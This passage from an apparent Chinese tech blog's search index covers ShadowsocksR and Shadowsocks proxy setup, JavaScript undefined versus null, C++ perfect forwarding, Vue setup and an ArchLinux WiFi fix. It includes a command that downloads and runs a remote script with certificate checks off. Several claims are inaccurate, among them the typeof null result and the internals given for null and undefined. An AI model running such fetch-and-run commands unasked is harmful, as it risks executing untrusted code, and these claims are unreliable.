id=\"ubuntu-系统\"><a href=\"#ubuntu-系统\" class=\"headerlink\" title=\"ubuntu 系统\"></a>ubuntu 系统</h4><p><code>apt-get update &amp;&amp; apt-get install -y docker &amp;&amp; service docker start</code><br>执行 docker ps， 如果看到下图，就表示 docker 安装成功了。</p>\n<ol>\n<li><p>下载和启动 SSR<br><code>-p 8888:8888</code> 意思是 SSR 跑着哪个端口，<code>-p 8000:8888</code>，客户端链接的时候是配置 8000 端口<br><code>$PASSWORD</code> 替换为你想要的密码<br><code>docker pull breakwa11/shadowsocksr &amp;&amp; docker run -itd -p 8888:8888 --env SERVER_PORT=8888 --env PASSWORD=$PASSWORD --name ssr breakwa11/shadowsocksr</code></p>\n</li>\n<li><p>查看 启动情况<br><code>docker logs -f ssr</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">server.py:106 server start with protocol[auth_aes128_md5] password [liuxingvpn123] method [aes-128-ctr] obfs [tls1.2_ticket_auth_compatible] obfs_param []</span><br></pre></td></tr></table></figure>\n<p>如果看到上面这样一段信息，就表示安装成功了。这段信息显示了 protocol，password，method，obfs_param，客户端需要和服务器端设置成一样，才能连接成功。</p>\n</li>\n<li><p>重启<br><code>docker restart ssr</code></p>\n</li>\n</ol>\n<h3 id=\"加密方式和混淆\"><a href=\"#加密方式和混淆\" class=\"headerlink\" title=\"加密方式和混淆\"></a>加密方式和混淆</h3><p>想探究原理的，请看这篇文章：<a href=\"https://github.com/breakwa11/shadowsocks-rss/blob/master/ssr.md\">https://github.com/breakwa11/shadowsocks-rss/blob/master/ssr.md</a><br>没有要求的，直接使用系统默认设置即可。ssr 已经选了一个比较适合的方案，auth_aes128_md5 + tls1.2_ticket_auth_compatible</p>\n<h3 id=\"进阶配置\"><a href=\"#进阶配置\" class=\"headerlink\" title=\"进阶配置\"></a>进阶配置</h3><p>选择何种TCP协议和混淆模式因各地区和VPS属性而定，这里面的变量太大，就是原作者也无法提供一种准确的恒定参数，那么首先看看各参数的解释（来自作者Wiki）</p>\n<h3 id=\"客户端\"><a href=\"#客户端\" class=\"headerlink\" title=\"客户端\"></a>客户端</h3><p>Android APP: SSR-android<br>iOS APP： Shadowrocket, Potatso2, Cross<br>MAC APP：ShadowsocksX-NG, ShadowsocksX-R<br>其它跨平台分支：avege, electron-ssr  </p>\n<p>客户端采用和服务器端同样的配置即可，客户端可以增加一个混淆参数，自由发挥即可。</p>\n<p>Port: 端口<br>Password: 填一个密码<br>Encrypt: 选择一种加密方式，根据服务器的设置<br>Protocol: 选择一种协议，根据服务器的设置<br>Protocolparam: 不用填<br>Obfs: 如果你的运营商没有封锁 SS 可以选择 plain，如果你的运营商是小运营  商，推荐选择 tls1.2_ticket_auth 或者 http_simple<br>Obfs_params: 可以不填  </p>\n<h3 id=\"结语\"><a href=\"#结语\" class=\"headerlink\" title=\"结语\"></a>结语</h3><p>SSR 到底能不能躲开监管，还有待考证。至少目前来说成为了我新的得力工具。</p>\n","tags":["科学上网"]},{"title":"underfined与null的区别","url":"/2021/04/01/underfined%E4%B8%8Enull%E7%9A%84%E5%8C%BA%E5%88%AB/","content":"<blockquote>\n<p>在javascript中<code>undefined</code>和<code>null</code>都可以表示空，不存在，他们之间有什么联系和区别呢？</p>\n</blockquote>\n<p><strong><code>undefined</code>和<code>null</code>作为条件的时候都等价于<code>false</code></strong><br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"literal\">undefined</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"literal\">true</span>)</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"literal\">false</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"literal\">true</span>)</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"literal\">false</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//false</span></span><br></pre></td></tr></table></figure><br>用松散比较判等的时候，JavaScript默认<code>undefined == null</code>，而严格比较时，由于类型不一致<code>undefined !== null</code>。<code>typeof undefined</code>的结果是<code>&#39;undefined&#39;</code>，而<code>typeof null</code>的结果是<code>&#39;Object&#39;</code>。</p>\n<span id=\"more\"></span>\n<p>那么<code>undefined</code>和<code>null</code>什么时候会出现呢？由于Javascript是动态类型语言，一个变量被声明的时候他是什么类型取决于他指向的对象是什么类型，如果声明对象的时候没有初始化呢？<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> a</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a)</span><br><span class=\"line\"><span class=\"comment\">//undefined</span></span><br></pre></td></tr></table></figure><br><strong>当声明的对象没有初始化的时候，默认的类型就是<code>undefined</code></strong>。那么如果变量都没有声明呢？<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"keyword\">typeof</span> bbb)</span><br><span class=\"line\"><span class=\"comment\">//undefined</span></span><br></pre></td></tr></table></figure><br><strong>当变量都没声明的时候，默认的类型也是<code>undefined</code></strong>。</p>\n<p>同理：如果一个函数没有没有返回值，或者返回了空，他的调用的返回结果就相当于未定义的变量或未初始化的变量。<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func1</span>(<span class=\"params\"></span>) </span>&#123;&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func2</span>(<span class=\"params\"></span>) </span>&#123;<span class=\"keyword\">return</span>;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"keyword\">typeof</span> func1()) <span class=\"comment\">//undefined</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"keyword\">typeof</span> func2()) <span class=\"comment\">//undefined</span></span><br></pre></td></tr></table></figure><br>所以：<strong>当一个函数返回了空，或者就没有返回，调用的结果就是<code>undefined</code></strong></p>\n<p><strong>JavaScript允许调用函数的时候传入比参数列表长度少的值，没有被传参的值默认是<code>undefined</code></strong><br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func3</span>(<span class=\"params\">a,b</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(a,b)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func3(<span class=\"number\">1</span>) <span class=\"comment\">// 1 undefined</span></span><br></pre></td></tr></table></figure></p>\n<p>JavaScript允许函数参数设置默认值，设置了默认值的参数，即使显示的传递了<code>undefined</code>，还是会赋值给定的默认值。<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func4</span>(<span class=\"params\">a, b = <span class=\"number\">1919810</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(a,b)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func4(<span class=\"number\">114514</span>, <span class=\"literal\">undefined</span>) <span class=\"comment\">// 114514 1919810</span></span><br></pre></td></tr></table></figure><br><strong>函数调用传入<code>undefined</code>参数等同于没传该参数</strong>。为了防止这种现象造成开发时的BUG，一般传空参数的时候，显示地传<code>null</code>而不是<code>undefined</code><br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func4</span>(<span class=\"params\">a, b = <span class=\"number\">1919810</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(a,b)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func4(<span class=\"number\">114514</span>, <span class=\"literal\">null</span>) <span class=\"comment\">// 114514 null</span></span><br></pre></td></tr></table></figure><br>又例如解构赋值：<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> [a, b = <span class=\"number\">114514</span>] = [<span class=\"number\">1919810</span>, <span class=\"literal\">undefined</span>]</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a,b) <span class=\"comment\">//1919810 114514</span></span><br></pre></td></tr></table></figure><br>因为<code>undefine</code>写了等于没写，所以实际上执行的是：<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> [a, b = <span class=\"number\">114514</span>] = [<span class=\"number\">1919810</span>]</span><br></pre></td></tr></table></figure><br>解释器检测到参数缺失，自然会给<code>b</code>设置默认值。如果非要让<code>b</code>不走默认值，就应该用<code>null</code>：<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> [a, b = <span class=\"number\">114514</span>] = [<span class=\"number\">1919810</span>, <span class=\"literal\">null</span>]</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a,b) <span class=\"comment\">//1919810 null</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>获取JSON中不存在的对象，返回<code>undefined</code></strong><br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">data = &#123;</span><br><span class=\"line\">    <span class=\"attr\">name</span>: <span class=\"string\">&#x27;tadokoro&#x27;</span>,</span><br><span class=\"line\">    <span class=\"attr\">age</span>: <span class=\"number\">114514</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(data[<span class=\"string\">&quot;yarimasune&quot;</span>]) <span class=\"comment\">// undefined</span></span><br></pre></td></tr></table></figure></p>\n<p><code>null</code>可以成为数字<code>0</code>，参与计算。而<code>undefined</code>无法作为数字，<code>undefined</code>参与计算会返回<code>NaN</code><br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Number</span>(<span class=\"literal\">null</span>) <span class=\"comment\">//0</span></span><br><span class=\"line\"><span class=\"built_in\">Number</span>(<span class=\"literal\">undefined</span>) <span class=\"comment\">//NaN</span></span><br><span class=\"line\"><span class=\"literal\">null</span> + <span class=\"number\">10</span> <span class=\"comment\">//10</span></span><br><span class=\"line\"><span class=\"literal\">undefined</span> + <span class=\"number\">10</span> <span class=\"comment\">//NaN</span></span><br></pre></td></tr></table></figure><br><code>null</code>的底层是一个<code>0</code>，而<code>undefined</code>本质是一个特殊的对象</p>\n<p><strong>总结</strong><br><code>undefined</code>一般是系统被动产生的，是一种被迫的替代性方案：</p>\n<ol>\n<li>变量没有声明</li>\n<li>函数没有<code>return</code>或<code>return</code>为空</li>\n<li>参数没有给值</li>\n<li>对象没有该属性</li>\n<li>本质上是个特殊对象，不能参与和<code>number</code>的运算</li>\n</ol>\n<p><code>null</code>往往是主动返回的，是开发者主动选择的结果</p>\n<ol>\n<li>本质上是0，可以参与和<code>number</code>的运算</li>\n<li>可以用于函数调用时，显示地传递空参数，防止默认值</li>\n</ol>\n","tags":["Javascript"]},{"title":"universal reference与完美转发","url":"/2022/08/07/universal%E4%B8%8E%E5%AE%8C%E7%BE%8E%E8%BD%AC%E5%8F%91/","content":"<h2 id=\"引子\"><a href=\"#引子\" class=\"headerlink\" title=\"引子\"></a>引子</h2><p>声明一个模板函数<code>func()</code>，在<code>main()</code>中调用它：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T&gt;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">func</span><span class=\"params\">(T&amp;&amp; v)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> v;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>在<code>main()</code>中调用它：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\">    func&lt;<span class=\"keyword\">int</span>&gt;(a); <span class=\"comment\">// compile error</span></span><br><span class=\"line\">    func&lt;<span class=\"keyword\">int</span>&gt;(std::<span class=\"built_in\">move</span>(a));</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>可以看到<code>func&lt;int&gt;(a)</code>这一行编译报错：<code>error: cannot bind rvalue reference of type ‘int&amp;&amp;’ to lvalue of type ‘int’</code>，原因显而易见：<code>int func(T&amp;&amp; v)</code>被特化成了<code>int func(int&amp;&amp; v)</code>，只接受右值。<br><span id=\"more\"></span></p>\n<p>取消显式地声明模板参数，尝试让编译器推导参数类型：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"built_in\">func</span>(a);</span><br><span class=\"line\">    <span class=\"built_in\">func</span>(std::<span class=\"built_in\">move</span>(a));</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>居然编译可以成功，说明<code>func(T&amp;&amp; v)</code>可以接受左值也可以接受右值，那么此时<code>func(T&amp;&amp; v)</code>中的<code>T&amp;&amp;</code>是什么呢？</p>\n<h2 id=\"Universal-Reference\"><a href=\"#Universal-Reference\" class=\"headerlink\" title=\"Universal Reference\"></a>Universal Reference</h2><p>在上述例子中，<code>T&amp;&amp;</code>不再单纯表示<code>T</code>类型的右值引用，而是<strong>万能引用(universal reference)</strong>。<code>T&amp;&amp;</code>可能被推导为左值引用也可能被推导成右值引用。</p>\n<p>出现universal reference的场景必须是不能确定引用类型的，变量的实际类型需要进行类型推导得出：</p>\n<ol>\n<li>模板函数中参数为<code>T&amp;&amp;</code></li>\n<li><p>使用<code>auto&amp;&amp; v</code></p>\n<ul>\n<li><blockquote>\n<p><code>std::vector&lt;T&gt;&amp;&amp;</code>作为参数只能表示右值引用，不是一个universal reference。因为无论<code>T</code>被推导成什么，参数永远都是个<code>vector</code>类型的右值引用</p>\n</blockquote>\n</li>\n<li><blockquote>\n<p><code>const T&amp;&amp;</code>只能表示常右值引用，不是一个universal reference。关于为什么<code>const T&amp;&amp;</code>只能表示右值详见：<a href=\"https://stackoverflow.com/questions/38814939/why-adding-const-makes-the-universal-reference-as-rvalue\">Why adding const makes the universal reference as rvalue</a></p>\n</blockquote>\n</li>\n</ul>\n</li>\n</ol>\n<p><strong>不是所有形如<code>T&amp;&amp;</code>的模板参数类型都是universal reference，关键还是要看是否涉及类型推导。</strong>看一个STL vector的例子：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> value_type, <span class=\"keyword\">typename</span> Allocator = allocator&lt;value_type&gt;&gt;</span><br><span class=\"line\">class vector</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">void</span> <span class=\"built_in\">push_back</span>(value_type &amp;&amp;__x);</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">emplace_back</span><span class=\"params\">(_Args&amp;&amp;... __args)</span></span></span><br><span class=\"line\"><span class=\"function\">&#125;</span></span><br></pre></td></tr></table></figure><br>对于<code>push_back</code>，由于<code>value_type</code>在声明<code>vector</code>对象时是必填项，所以此处<code>value_type</code>类型已经确定，<code>value_type &amp;&amp;__x</code>不涉及类型推导，是一个右值引用，不是universal reference。</p>\n<p>对于<code>emplace_back</code>，类型<code>_Args</code>独立于<code>value_type</code>，无法在<code>vector</code>被声明时判断类型，需要推导类型，此处是<code>_Args&amp;&amp;... __args</code>是一个universal reference。</p>\n<p>对于模板引用，折叠的规则如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&amp;&amp; &amp;&amp; -&gt; &amp;&amp;</span><br><span class=\"line\">&amp; &amp;&amp; -&gt; &amp;</span><br><span class=\"line\">&amp; &amp; -&gt; &amp;</span><br><span class=\"line\">&amp;&amp; &amp; -&gt; &amp;</span><br></pre></td></tr></table></figure><br>可以观察发现只有<code>T&amp;&amp;</code>随着<code>T</code>类型的变化而变化，所以<code>T&amp;&amp;</code>被用作universal reference</p>\n<h2 id=\"std-forward\"><a href=\"#std-forward\" class=\"headerlink\" title=\"std::forward\"></a>std::forward</h2><p>在下述例子中，定义两个同名函数，分别接受一个左值和右值：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T&gt;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">print</span><span class=\"params\">(T&amp;&amp; v)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    std::cout &lt;&lt; <span class=\"string\">&quot;rvalue v = &quot;</span> &lt;&lt; v &lt;&lt; std::endl;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T&gt;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">print</span><span class=\"params\">(T&amp; v)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    std::cout &lt;&lt; <span class=\"string\">&quot;lvalue v = &quot;</span> &lt;&lt; v &lt;&lt; std::endl;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T&gt;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">func</span><span class=\"params\">(T&amp;&amp; v)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(v)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> v;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"built_in\">func</span>(a);</span><br><span class=\"line\">    <span class=\"built_in\">func</span>(std::<span class=\"built_in\">move</span>(a));</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>对于<code>func</code>传入的左值和右值，预期应该是输出：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">lvalue v = 1</span><br><span class=\"line\">rvalue v = 1</span><br></pre></td></tr></table></figure><br>但是实际上输出是：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">lvalue v = 1</span><br><span class=\"line\">lvalue v = 1</span><br></pre></td></tr></table></figure><br>原因是因为<code>func(T&amp;&amp; v)</code>中的参数<code>v</code>在<code>print</code>看起来也是一个左值。无论参数是什么类型，一旦给右值绑定了引用，右值也就有了名字，对于下一个调用函数而言，他也是左值。</p>\n<p>如果要让<code>func(T&amp;&amp; v)</code>按照左右值区分走不同的<code>print</code>函数，就需要用到<code>std::forward</code>。</p>\n<p>将<code>print</code>实现改为：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T&gt;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">func</span><span class=\"params\">(T&amp;&amp; v)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(std::forward&lt;T&gt;(v));</span><br><span class=\"line\">    <span class=\"keyword\">return</span> v;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>此刻输出就变成了预期的输出。这种使得参数传递不改变类型的方式就叫做<strong>完美转发</strong>。</p>\n<p>gcc对<code>std::forward</code>的实现如下：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"> <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">  *  @brief  Forward an lvalue.</span></span><br><span class=\"line\"><span class=\"comment\">  *  @return The parameter cast to the specified type.</span></span><br><span class=\"line\"><span class=\"comment\">  *</span></span><br><span class=\"line\"><span class=\"comment\">  *  This function is used to implement &quot;perfect forwarding&quot;.</span></span><br><span class=\"line\"><span class=\"comment\">  */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> _Tp&gt;</span></span><br><span class=\"line\"><span class=\"function\">  <span class=\"keyword\">constexpr</span> _Tp&amp;&amp;</span></span><br><span class=\"line\"><span class=\"function\">  <span class=\"title\">forward</span><span class=\"params\">(<span class=\"keyword\">typename</span> std::remove_reference&lt;_Tp&gt;::type&amp; <span class=\"keyword\">__t</span>)</span> <span class=\"keyword\">noexcept</span></span></span><br><span class=\"line\"><span class=\"function\">  </span>&#123; <span class=\"keyword\">return</span> <span class=\"keyword\">static_cast</span>&lt;_Tp&amp;&amp;&gt;(<span class=\"keyword\">__t</span>); &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">  *  @brief  Forward an rvalue.</span></span><br><span class=\"line\"><span class=\"comment\">  *  @return The parameter cast to the specified type.</span></span><br><span class=\"line\"><span class=\"comment\">  *</span></span><br><span class=\"line\"><span class=\"comment\">  *  This function is used to implement &quot;perfect forwarding&quot;.</span></span><br><span class=\"line\"><span class=\"comment\">  */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> _Tp&gt;</span></span><br><span class=\"line\"><span class=\"function\">  <span class=\"keyword\">constexpr</span> _Tp&amp;&amp;</span></span><br><span class=\"line\"><span class=\"function\">  <span class=\"title\">forward</span><span class=\"params\">(<span class=\"keyword\">typename</span> std::remove_reference&lt;_Tp&gt;::type&amp;&amp; <span class=\"keyword\">__t</span>)</span> <span class=\"keyword\">noexcept</span></span></span><br><span class=\"line\"><span class=\"function\">  </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">static_assert</span></span>(!std::is_lvalue_reference&lt;_Tp&gt;::value, <span class=\"string\">&quot;template argument&quot;</span></span><br><span class=\"line\">      <span class=\"string\">&quot; substituting _Tp is an lvalue reference type&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">static_cast</span>&lt;_Tp&amp;&amp;&gt;(<span class=\"keyword\">__t</span>);</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure><br>可见<code>std::forward</code>使用<code>static_cast</code>将类型映射到制定的模板类型上。执行<code>func(a)</code>时，特化为<code>func&lt;int&amp;&gt;(int&amp; &amp;&amp;)</code>，接着执行<code>std::forward&lt;int&gt;(int &amp;a)</code>，返回类型为<code>int&amp;</code>，调用<code>print&lt;int&gt;(int&amp;)</code>。当执行<code>func(std::move(a))</code>时，特化为<code>func&lt;int&amp;&amp;&gt;(int&amp;&amp; &amp;&amp;)</code>，接着执行<code>std::forward&lt;int&amp;&amp;&gt;(a)</code>，返回类型为<code>int&amp;&amp;</code>，调用<code>print&lt;int&amp;&amp;&gt;(int&amp;&amp; &amp;&amp;)</code>。</p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://stackoverflow.com/questions/20364297/why-universal-references-have-the-same-syntax-as-rvalue-references\">why universal references have the same syntax as rvalue reference</a></li>\n</ul>\n","categories":["C++之左值右值"],"tags":["CPP"]},{"title":"vue项目创建","url":"/2019/05/15/vue%E9%A1%B9%E7%9B%AE%E5%88%9B%E5%BB%BA/","content":"<ul>\n<li>安装最新的Vue Cli 3,如果有之前的版本先卸载 <code>npm uninstall -g vue-cli</code>，安装新版本 <code>npm install -g @vue/cli</code></li>\n<li>创建一个vue-demo项目 <code>vue create vue-demo</code> 或者可以不用上一步 <code>npx @vue/cli create vue-demo</code></li>\n<li>选择yarn，<code>yarn serve</code> ，打开浏览器localhost:8080</li>\n<li>编译：<code>yarn build</code> ，编译的文件在dist目录中。</li>\n</ul>\n<p>总的来说，Vue Cli 3和React脚手架create-react-app简直一毛一样</p>\n<span id=\"more\"></span>","tags":["Vue"]},{"title":"vultr配置ss教程","url":"/2017/10/05/vultr%E9%85%8D%E7%BD%AEss%E6%95%99%E7%A8%8B/","content":"<ol>\n<li>首先，需要购买境外服务器，在这里选用<a href=\"https://www.vultr.com/\">vultr</a></li>\n<li>首先需要安装wget</li>\n<li>配置完成后，输入第一条命令：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget --no-check-certificate  </span><br><span class=\"line\">https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh</span><br></pre></td></tr></table></figure>\n<p>完成后，输入第二条命令：<br><code>chmod +x shadowsocks.sh</code>  </p>\n<p>完成后，第三条命令：<br><code>./shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log</code>  </p>\n<p>中间会提示你输入你的SS SERVER的账号，和端口。不输入就是默认。<br>跑完命令后会出来你的SS客户端的信息。请立即copy下来加以保存。  </p>\n<span id=\"more\"></span>\n<p>上面的命令全部回车执行后，如果没有报错，即为执行成功，出现确认提示的时候，输入 y 后，回车即可。</p>\n<p>安装完成后，脚本提示如下：  </p>\n<pre><code>Congratulations, shadowsocks install completed!   \nYour Server IP:your_server_ip    \nYour Server Port:your_server_port    \nYour Password:your_password \nYour Local IP:127.0.0.1  \nYour Local Port:1080  \nYour Encryption Method:aes-256-cfb  \n</code></pre><p>记录保存好你的上述信息：Server IP、Server Port、Password、Encryption Method<br>这时你的专属ss已经大好了，开始使用吧。</p>\n","tags":["科学上网"]},{"title":"ArchLinux下WiFi网卡的坑","url":"/2019/05/06/wifi%E7%BD%91%E5%8D%A1%E7%9A%84%E5%9D%91/","content":"<p>Archlinux下笔记本wifi用着用着忽然失效了，但插入外置网卡可以使用，原以为是网卡坏了，但换成windows发现可以使用。</p>\n<p>输入<code>ifconfig</code>发现没有网卡，输入<code>ip link</code> :<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">wlp2s0: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc mq state DOWN mode DEFAULT group default qlen 1000</span><br><span class=\"line\">link/ether ae:e3:e0:2b:fb:ca brd ff:ff:ff:ff:ff:ff</span><br></pre></td></tr></table></figure></p>\n<p>发现wlp2s0没有开启，<code>ip link set wlp2s0 up</code> ,结果state依然是DOWN，此时重新安装<code>networkManager</code>,还是没有解决问题，此时怀疑应该是配置问题：<br><code>sudo vim /etc/NetworkManager/NetworkManager.conf</code>,发现unmanaged-devices中有wlp2s0:</p>\n<span id=\"more\"></span>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[keyfile]</span><br><span class=\"line\">unmanaged-devices=interface-name:ap0;interface-name:ap1;interface-name:ap2;interface-name:ap3;interface-name:ap4;intnetworkManager.conf unmanaged-deviceserface-name:wlp2s0 </span><br></pre></td></tr></table></figure>\n<p>注释掉这一行，重启，<code>sudo systemctl restart NetworkManager</code>,问题解决。</p>\n","tags":["Linux"]},{"title":"从一次重载失败探秘左值与右值","url":"/2021/06/23/%E4%B8%80%E6%AC%A1%E8%BE%93%E5%87%BA%E6%B5%81%E9%87%8D%E8%BD%BD%E9%94%99%E8%AF%AF%E7%9A%84%E5%88%86%E6%9E%90/","content":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><p>我写了一个矩阵加减的程序，其中<code>main.cpp</code>如下：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// main.cpp</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&quot;matrix.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span 